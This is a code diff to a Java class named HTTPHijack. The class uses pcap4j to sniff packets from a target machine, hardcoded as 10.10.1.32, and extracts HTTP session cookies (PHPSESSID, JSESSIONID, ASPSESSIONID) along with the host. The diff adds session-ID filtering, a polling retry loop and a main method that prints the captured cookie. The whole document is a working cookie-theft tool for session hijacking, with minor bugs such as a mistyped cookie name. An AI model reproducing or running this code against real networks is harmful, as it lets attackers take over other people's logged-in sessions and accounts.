@@ -1,14 +1,13 @@
-import java.io.*;
-
 import org.pcap4j.core.*;
 
+import java.io.*;
 import java.net.InetAddress;
-import java.net.UnknownHostException;
+import java.rmi.UnknownHostException;
 import java.util.concurrent.TimeoutException;
 
 public class HTTPHijack {
 
-    static void OpenFile(String name) {
+    private static void OpenFile(String name) {
         try {
             File myObj = new File(name);
             if (myObj.createNewFile()) {
@@ -22,11 +21,11 @@ public class HTTPHijack {
         }
 
     }
-    static void WritePackets(String target, int time){
+    private static void WritePackets(String target, int time){
         InetAddress addr = null;
         try {
             addr = InetAddress.getByName(target);
-        } catch (UnknownHostException e) {
+        } catch (java.net.UnknownHostException e) {
             e.printStackTrace();
         }
         PcapNetworkInterface nif = null;
@@ -60,8 +59,10 @@ public class HTTPHijack {
             for(int i = 0; i < 64 ; i++) {
                 packetWriter.write(String.valueOf(handle.getNextPacketEx()));
             }
-        } catch (PcapNativeException | TimeoutException | NotOpenException | NullPointerException | IOException e) {
+        } catch (PcapNativeException | NotOpenException | NullPointerException | IOException e) {
             e.printStackTrace();
+        } catch (TimeoutException e){
+            System.err.println("No cookies found yet!");
         }
         handle.close();
         try {
@@ -71,7 +72,7 @@ public class HTTPHijack {
         }
     }
 
-    static void StripPackets(){
+    private static void StripPackets(){
         BufferedReader reader;
         FileWriter dataWriter;
         try {
@@ -102,7 +103,7 @@ public class HTTPHijack {
         }
     }
 
-    static String[] StripData(){
+    private static String[] StripData(){
         String[] output = new String[2];
         BufferedReader reader;
         try {
@@ -115,9 +116,25 @@ public class HTTPHijack {
                     //System.out.println(host);
                 }
                 if(line.startsWith("Cookie:")){
-                    String cookie = line.substring(8);
-                    output[1] = cookie;
-                    return output;
+                    boolean containsSession = false;
+                    String cookie = line.substring(8);//JSESSIONID (Java EE), PHPSESSID (PHP), and ASPSESSIONID (Microsoft ASP).
+                    if(cookie.contains("PHPSESSID")){
+                        cookie = cookie.substring(cookie.indexOf("PHPSESSID"));
+                        containsSession = true;
+                    } else if(cookie.contains("JSESSIONID")){
+                        cookie = cookie.substring(cookie.indexOf("JSESSIONID"));
+                        containsSession = true;
+                    } else if(cookie.contains("PASPSESSIONID")){
+                        cookie = cookie.substring(cookie.indexOf("ASPSESSIONID"));
+                        containsSession = true;
+                    }
+                    if(cookie.contains(" ")){
+                        cookie = cookie.substring(0, cookie.indexOf(" "));
+                    }
+                    if(containsSession) {
+                        output[1] = cookie;
+                        return output;
+                    }
                 }
                 line = reader.readLine();
             }
@@ -125,14 +142,32 @@ public class HTTPHijack {
         } catch (IOException e) {
             e.printStackTrace();
         }
-        return output;
+        return null;
     }
 
     public static String[] Hijacker(String target, int timeout){
         OpenFile("DataOutput.txt");
         OpenFile("PacketsOutput.txt");
-        WritePackets(target, timeout);
-        StripPackets();
-        return StripData();
+        for(int i = 0; i < timeout/10; i++) {
+            WritePackets(target, 9);
+            StripPackets();
+            String[] ans = StripData();
+            if(ans != null) {
+                return ans;
+            }
+        }
+        return null;
+    }
+
+    public static void main(String[] args) {
+        String target = "10.10.1.32";
+        int time = 40;//in seconds
+        String[] ans = Hijacker(target, time);
+        try {
+            System.out.println(ans[0]);
+            System.out.println(ans[1]);
+        } catch (NullPointerException e){
+            System.out.println("No cookie found!");
+        }
     }
 }
